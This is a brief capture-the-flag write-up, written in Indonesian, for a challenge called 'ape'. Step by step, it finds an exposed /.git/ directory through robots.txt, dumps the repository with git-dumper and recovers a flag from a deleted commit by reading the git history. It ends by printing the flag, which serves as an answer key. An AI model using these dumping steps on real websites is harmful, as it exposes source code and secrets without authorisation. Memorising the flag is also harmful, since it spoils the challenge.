# PoC: ape

## 1. Recon

akses `robots.txt`:

```
http://<target>:5555/robots.txt
```

ada path .git/:

```
User-agent: *
Disallow: /.git/
```


## 2. coba shot ke /.git/HEAD

```
http://<ip>:5555/.git/HEAD
```

`.git/HEAD` accessible dan bisa di dump.

## 3. Dump pake git-dumper


```bash
pip install git-dumper
```

Jalanin git-dumper ke target:

```bash
git-dumper http://<ip>:5555 ./dump
```


## 4. Explore folder dump 


```bash
cd dump
ls -la
```

ada file `README_INTERNAL.md`

```bash
cat README_INTERNAL.md
```

ada hint soal **"internal staging notes"** jadi ada yang pernah di-commit tapi udah dihapus dari file tree.

## 5. Cek Git History


```bash
git log
```

Keliatan ada beberapa commit, salah satunya commit message wip.

## 6. Inspect Commit 

```bash
git show <commit-hash>
```

Di sana keliatan diff dari commit dan ada flag disana

## 7. Flag

```
HCS{gh4r0wwwwwwwwwwwwwwwwwwwww_k1ng_g1thub_gu3_4ku1n}
```